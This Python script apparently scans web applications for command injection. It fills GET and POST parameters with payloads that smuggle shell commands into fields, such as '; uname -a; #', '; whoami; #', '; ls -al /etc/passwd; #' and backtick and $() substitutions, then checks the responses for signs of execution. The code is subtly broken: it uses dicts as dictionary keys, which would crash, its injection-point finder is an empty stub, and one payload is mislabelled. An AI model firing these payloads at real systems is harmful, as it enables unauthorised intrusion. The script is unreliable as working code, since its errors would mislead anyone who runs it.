import requests
import urllib.parse

def test_code_injection(url, payloads):
    """
    Tests a web application for code injection vulnerabilities.

    Args:
        url (str): The URL of the web application to test.
        payloads (list): A list of code injection payloads to try.

    Returns:
        dict: A dictionary where keys are the injection points and values are lists of successful payloads.
    """
    successful_injections = {}

    # 1. Identify potential injection points (form fields, URL parameters, etc.).  This is a placeholder, as the specific method depends heavily on the app.
    #   For a real test, you'd need to inspect the app's code and/or use a proxy like Burp Suite to manually identify injection points.
    injection_points = identify_injection_points(url)  # Replace with actual identification logic

    for injection_point in injection_points:
        successful_injections[injection_point] = []
        for payload in payloads:
            try:
                # 2. Inject payloads into the identified injection points and analyze the application's response.
                if injection_point["method"] == "get":
                    params = injection_point["params"].copy() # Avoid modifying original
                    params[injection_point["param_name"]] = payload
                    full_url = url + "?" + urllib.parse.urlencode(params)
                    response = requests.get(full_url, timeout=5)
                elif injection_point["method"] == "post":
                    data = injection_point["data"].copy()  # Avoid modifying original
                    data[injection_point["param_name"]] = payload
                    response = requests.post(url, data=data, timeout=5)
                else:
                    print(f"Unsupported method: {injection_point['method']}")
                    continue

                # 3. Look for indicators of successful code execution.  This is CRITICAL.  The checks here will VARY WILDLY
                #    depending on what kind of code injection you're looking for.  Examples:

                if "error" in response.text.lower() and "syntax" in response.text.lower():
                    print(f"Possible Code Injection Vulnerability at {injection_point}: {payload} caused a syntax error.")
                    successful_injections[injection_point].append(payload)
                elif "warning" in response.text.lower() and "eval()" in response.text.lower(): #Detect PHP eval()
                    print(f"Possible Code Injection Vulnerability at {injection_point}: {payload} caused an eval() warning.")
                    successful_injections[injection_point].append(payload)
                elif "root:" in response.text and injection_point["os"] == "linux": #Linux specific; looking for /etc/passwd
                    print(f"Possible Code Injection Vulnerability at {injection_point}: {payload} allowed access to /etc/passwd.")
                    successful_injections[injection_point].append(payload)
                elif "systeminfo" in payload and "os name:" in response.text.lower() and injection_point["os"] == "windows": #Windows specific
                    print(f"Possible Code Injection Vulnerability at {injection_point}: {payload} allowed to run systeminfo")
                    successful_injections[injection_point].append(payload)

                # 4. Analyze the server-side logs (if possible) for evidence of code execution. Often requires cooperation
                #    of server admins, but this is the most reliable method. Can't be automated in general.

            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")
            except Exception as e:
                print(f"An error occurred: {e}")

    return successful_injections


def identify_injection_points(url):
    """
    Placeholder function for identifying potential injection points.
    This function needs to be replaced with actual logic that identifies
    form fields, URL parameters, and other potential injection points in the web application.

    Returns:
        list: A list of dictionaries, where each dictionary represents an injection point.
              Each dictionary should include:
                - method (str): "get" or "post"
                - param_name (str): The name of the parameter to inject into
                - params (dict, optional): Dictionary of other GET parameters (if any)
                - data (dict, optional): Dictionary of other POST parameters (if any)
                - os (str): "windows" or "linux".  Required if OS-specific payloads are used

    Example:
       return [
           {"method": "get", "param_name": "id", "params": {}, "os": "linux"},
           {"method": "post", "param_name": "name", "data": {"age": "30"}, "os": "linux"}
       ]
    """
    #In a real scenario, this would require manual analysis of the website or the use of a tool such as Burp Suite.
    return []  # Replace with actual injection point data

if __name__ == '__main__':
    target_url = "http://example.com/vulnerable_script.php"  # Replace with your target URL

    # OS-specific payloads.  Expand as needed.  CRITICAL: Ensure 'os' parameter is set correctly in identify_injection_points
    code_injection_payloads = [
        "; uname -a; #",  # Unix/Linux: Execute uname command
        "; systeminfo; #",  # Windows:  Execute systeminfo command
        "; whoami; #",  # Unix/Linux/Windows: Display current user
        "; ls -al /etc/passwd; #", #Linux: Attempt to read password file (often restricted)
        "; dir c:\\windows; #",   #Windows: Attempt to list files in windows directory (often restricted)
        "`uname -a`",  # Backticks in PHP/other languages
        "`systeminfo`", # Backticks in PHP/other languages
        '$(uname -a)', # Command substitution
        '${systeminfo}' # Command substitution
        #Add more payloads here
    ]


    results = test_code_injection(target_url, code_injection_payloads)

    print("\nResults:")
    for injection_point, successful_payloads in results.items():
        if successful_payloads:
            print(f"  Injection Point: {injection_point}")
            print("   Successful Payloads:")
            for payload in successful_payloads:
                print(f"    - {payload}")
        else:
            print(f"  No code injection vulnerabilities found at {injection_point}")